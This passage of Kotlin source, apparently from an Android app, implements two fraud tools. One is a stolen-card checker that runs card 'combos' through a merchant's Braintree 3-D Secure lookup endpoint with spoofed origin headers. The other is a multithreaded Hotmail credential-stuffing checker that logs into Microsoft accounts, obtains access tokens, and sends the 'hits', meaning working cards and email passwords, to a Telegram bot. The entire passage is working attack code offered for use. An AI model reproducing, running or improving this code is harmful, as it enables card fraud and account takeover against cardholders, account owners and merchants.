            val lookupUrl = "https://api.braintreegateway.com/merchants/cczs3q47s9sn4m9y/client_api/v1/payment_methods/$token/three_d_secure/lookup"
            val lookupReq = Request.Builder()
                .url(lookupUrl)
                .header("Content-Type", "application/json")
                .header("origin", "https://somersetandwood.com")
                .header("referer", "https://somersetandwood.com/")
                .post(RequestBody.create("application/json".toMediaTypeOrNull(), lookupPayload))
                .build()

            var vbv = "Unknown Error"
            workerClient.newCall(lookupReq).execute().use { response ->
                val body = response.body?.string() ?: ""
                try {
                    val json = org.json.JSONObject(body)
                    vbv = json.optJSONObject("paymentMethod")
                        ?.optJSONObject("threeDSecureInfo")
                        ?.optString("status", "Unknown Error") ?: "Unknown Error"
                } catch (e: Exception) {}
            }

            // Classification
            var resultStr = ""
            var passed = false
            var isOtp = false

            if (vbv.contains("authenticate_successful")) {
                resultStr = "3DS Authenticate Successful ✅ "
                passed = true
            } else if (vbv.contains("challenge_required")) {
                resultStr = "3DS Challenge Required \u274C"
                isOtp = true
            } else if (vbv.contains("authenticate_attempt_successful")) {
                resultStr = "3DS Authenticate Attempt Successful ✅"
                passed = true
            } else if (vbv.contains("authenticate_rejected")) {
                resultStr = "3DS Authenticate Rejected \u274C"
                isOtp = true
            } else if (vbv.contains("authenticate_frictionless_failed")) {
                resultStr = "3DS Authenticate Frictionless Failed \u274C"
                isOtp = true
            } else if (vbv.contains("lookup_card_error")) {
                resultStr = "lookup_card_error ⚠️"
            } else if (vbv.contains("lookup_error")) {
                resultStr = "lookup Error ⚠️"
            } else {
                resultStr = vbv
            }

            if (passed) {
                updateOtpStats(hit = 1)
                addOtpLog("PASSED ✅ -> $combo | $resultStr")
                sendOtpTelegram(combo, "Passed ✅", resultStr)
            } else if (isOtp) {
                updateOtpStats(retry = 1) // Using retry for OTP
                addOtpLog("OTP ⛔ -> $combo | $resultStr")
                sendOtpTelegram(combo, "OTP ⛔", resultStr)
            } else {
                updateOtpStats(bad = 1)
                addOtpLog("DECLINED \u274C -> $combo | $resultStr")
            }

        } catch (e: Exception) {
            updateOtpStats(bad = 1)
            addOtpLog("$combo -> خطأ (Connection Error)")
        }
    }
    
    private suspend fun updateOtpStats(hit: Int = 0, bad: Int = 0, retry: Int = 0, unknown: Int = 0) {
        withContext(Dispatchers.Main) {
            _otpState.update { 
                it.copy(
                    hits = it.hits + hit,
                    bad = it.bad + bad,
                    retry = it.retry + retry,
                    unknown = it.unknown + unknown
                )
            }
        }
    }

    private suspend fun addOtpLog(msg: String) {
        withContext(Dispatchers.Main) {
            _otpState.update {
                val newLogs = it.logs.toMutableList()
                newLogs.add(0, msg)
                if (newLogs.size > 100) newLogs.removeAt(newLogs.size - 1)
                it.copy(logs = newLogs)
            }
        }
    }

    private fun sendOtpTelegram(combo: String, statusFlag: String, responseStr: String) {
        val botToken = _otpState.value.botToken
        val chatId = _otpState.value.chatId
        if (botToken.isBlank() || chatId.isBlank()) return

        Thread {
            try {
                val mdMsg = "<b>$statusFlag</b>\n- <b>Card</b> ⇾ <code>$combo</code>\n- <b>Gateway</b> ⇾ Braintree Lookup\n- <b>Response</b> ⇾ $responseStr\n━━━━━━━━━━━━━━━━\n[↯] <b>Bot By</b> ⇾ @taalf"
                val form = FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", mdMsg)
                    .add("parse_mode", "HTML")
                    .build()
                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendMessage")
                    .post(form)
                    .build()
                val client = OkHttpClient()
                client.newCall(request).execute().close()
            } catch (e: Exception) { }
        }.start()
    }
    
    // --- Hotmail Checker Functions ---
    fun updateHotmailAccountList(text: String) { _hotmailState.update { it.copy(accountList = text) } }
    fun updateHotmailBotToken(text: String) { _hotmailState.update { it.copy(botToken = text) } }
    fun updateHotmailChatId(text: String) { _hotmailState.update { it.copy(chatId = text) } }
    fun updateHotmailThreads(text: String) { _hotmailState.update { it.copy(threadCount = text) } }

    private var hotmailJob: Job? = null
    
    fun startHotmailChecking() {
        if (_hotmailState.value.isRunning) return
        val accounts = _hotmailState.value.accountList.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (accounts.isEmpty()) {
            _hotmailState.update { it.copy(statusText = "الرجاء إدخال حسابات أولاً.") }
            return
        }

        _hotmailState.update { 
            it.copy(
                isRunning = true,
                good = 0,
                bad = 0,
                twoFa = 0,
                unknown = 0,
                logs = emptyList(),
                statusText = "جاري الفحص..."
            )
        }

        hotmailJob = viewModelScope.launch(Dispatchers.IO) {
            val numThreads = _hotmailState.value.threadCount.toIntOrNull() ?: 5
            val accountQueue = kotlinx.coroutines.channels.Channel<String>(kotlinx.coroutines.channels.Channel.UNLIMITED)
            accounts.forEach { accountQueue.trySend(it) }
            accountQueue.close()

            val workers = List(numThreads) {
                launch {
                    for (combo in accountQueue) {
                        checkHotmailAccount(combo)
                    }
                }
            }
            workers.joinAll()
            _hotmailState.update { it.copy(isRunning = false, statusText = "تم الانتهاء.") }
        }
    }

    fun stopHotmailChecking() {
        hotmailJob?.cancel()
        _hotmailState.update { it.copy(isRunning = false, statusText = "تم التوقف.") }
    }
    
    private suspend fun checkHotmailAccount(combo: String) {
        val parts = combo.split(":", limit = 2)
        if (parts.size < 2) {
            addHotmailLog("$combo -> صيغة خاطئة")
            updateHotmailStats(bad = 1)
            return
        }
        val email = parts[0].trim()
        val password = parts[1].trim()

        val workerClient = OkHttpClient.Builder()
            .followRedirects(false)
            .followSslRedirects(false)
            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .build()
            
        try {
            // STEP 1: check account
            val url1Req = Request.Builder()
                .url("https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=$email")
                .header("X-OneAuth-AppName", "Outlook Lite")
                .header("X-Office-Version", "3.11.0-minApi24")
                .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)")
                .build()

            var r1Text = ""
            workerClient.newCall(url1Req).execute().use { response ->
                r1Text = response.body?.string() ?: ""
            }
            
            if (r1Text.contains("Neither") || r1Text.contains("Both") || r1Text.contains("Placeholder") || r1Text.contains("OrgId")) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD -> $email:$password")
                return
            }
            if (!r1Text.contains("MSAccount")) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD -> $email:$password")
                return
            }
            
            // STEP 2: authorize to get PPFT
            val url2Req = Request.Builder()
                .url("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=$email&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .build()

            var r2Text = ""
            var r2Url = ""
            workerClient.newCall(url2Req).execute().use { response ->
                r2Text = response.body?.string() ?: ""
                r2Url = response.request.url.toString()
            }

            val urlPostMatcher = java.util.regex.Pattern.compile("urlPost\":\"([^\"]+)\"").matcher(r2Text)
            val ppftMatcher = java.util.regex.Pattern.compile("name=\\\\\"PPFT\\\\\" id=\\\\\"i0327\\\\\" value=\\\\\"([^\"]+)\"").matcher(r2Text)

            if (!urlPostMatcher.find() || !ppftMatcher.find()) {
                updateHotmailStats(unknown = 1)
                addHotmailLog("UNKNOWN -> $email:$password (Failed to extract Post/PPFT)")
                return
            }
            val postUrl = urlPostMatcher.group(1)?.replace("\\\\/", "/") ?: ""
            val ppft = ppftMatcher.group(1) ?: ""

            // STEP 3: Login POST
            val encEmail = java.net.URLEncoder.encode(email, "UTF-8")
            val encPass = java.net.URLEncoder.encode(password, "UTF-8")
            val encPpft = java.net.URLEncoder.encode(ppft, "UTF-8")
            val loginData = "i13=1&login=$encEmail&loginfmt=$encEmail&type=11&LoginOptions=1&passwd=$encPass&ps=2&PPFT=$encPpft&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"

            val url3Req = Request.Builder()
                .url(postUrl)
                .post(RequestBody.create("application/x-www-form-urlencoded".toMediaTypeOrNull(), loginData))
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                .header("Origin", "https://login.live.com")
                .header("Referer", r2Url)
                .build()

            var r3Text = ""
            var locationHeader = ""
            workerClient.newCall(url3Req).execute().use { response ->
                r3Text = response.body?.string() ?: ""
                locationHeader = response.header("Location") ?: ""
            }

            if (r3Text.contains("account or password is incorrect") || r3Text.contains("error") || r3Text.contains("Incorrect password") || r3Text.contains("Invalid credentials")) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD -> $email:$password")
                return
            }

            if (r3Text.contains("identity/confirm") || r3Text.lowercase().contains("twofactor")) {
                updateHotmailStats(twoFa = 1)
                addHotmailLog("2FA -> $email:$password")
                return
            }

            if (r3Text.contains("Abuse") || r3Text.contains("signedout") || r3Text.contains("locked")) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD (Locked) -> $email:$password")
                return
            }

            if (locationHeader.isEmpty()) {
                updateHotmailStats(unknown = 1)
                addHotmailLog("UNKNOWN -> $email:$password (No redirect Location)")
                return
            }

            val codeMatcher = java.util.regex.Pattern.compile("code=([^&]+)").matcher(locationHeader)
            if (!codeMatcher.find()) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD -> $email:$password (No code in redirect)")
                return
            }

            val code = codeMatcher.group(1) ?: ""

            // STEP 4: Token Request
            val tokenData = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D&grant_type=authorization_code&code=$code&scope=profile openid offline_access https://outlook.office.com/M365.Access"
            val tokenReq = Request.Builder()
                .url("https://login.microsoftonline.com/consumers/oauth2/v2.0/token")
                .post(RequestBody.create("application/x-www-form-urlencoded".toMediaTypeOrNull(), tokenData))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .build()

            var r4Text = ""
            var r4Code = 0
            workerClient.newCall(tokenReq).execute().use { response ->
                r4Code = response.code
                r4Text = response.body?.string() ?: ""
            }

            if (r4Code != 200 || !r4Text.contains("access_token")) {
                updateHotmailStats(bad = 1)
                addHotmailLog("BAD -> $email:$password")
                return
            }

            // HIT!
            updateHotmailStats(good = 1)
            addHotmailLog("GOOD ✅ -> $email:$password")
            sendHotmailTelegram(email, password)

        } catch (e: Exception) {
            updateHotmailStats(unknown = 1)
            addHotmailLog("ERROR -> $email:$password | ${e.message}")
        }
    }
    
    private suspend fun updateHotmailStats(good: Int = 0, bad: Int = 0, twoFa: Int = 0, unknown: Int = 0) {
        withContext(Dispatchers.Main) {
            _hotmailState.update { 
                it.copy(
                    good = it.good + good,
                    bad = it.bad + bad,
                    twoFa = it.twoFa + twoFa,
                    unknown = it.unknown + unknown
                )
            }
        }
    }

    private suspend fun addHotmailLog(msg: String) {
        withContext(Dispatchers.Main) {
            _hotmailState.update {
                val newLogs = it.logs.toMutableList()
                newLogs.add(0, msg)
                if (newLogs.size > 100) newLogs.removeAt(newLogs.size - 1)
                it.copy(logs = newLogs)
            }
        }
    }

    private fun sendHotmailTelegram(email: String, pass: String) {
        val botToken = _hotmailState.value.botToken
        val chatId = _hotmailState.value.chatId
        if (botToken.isBlank() || chatId.isBlank()) return

        Thread {
            try {
                val mdMsg = "<b>🔥 HOTMAIL HIT 🔥</b>\n- <b>Email</b> ⇾ <code>$email</code>\n- <b>Password</b> ⇾ <code>$pass</code>\n━━━━━━━━━━━━━━━━\n[↯] <b>Bot Checker</b>"
                val form = FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", mdMsg)
                    .add("parse_mode", "HTML")
                    .build()
                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendMessage")
                    .post(form)
                    .build()
                val client = OkHttpClient()
                client.newCall(request).execute().close()
            } catch (e: Exception) { }
        }.start()
    }
}

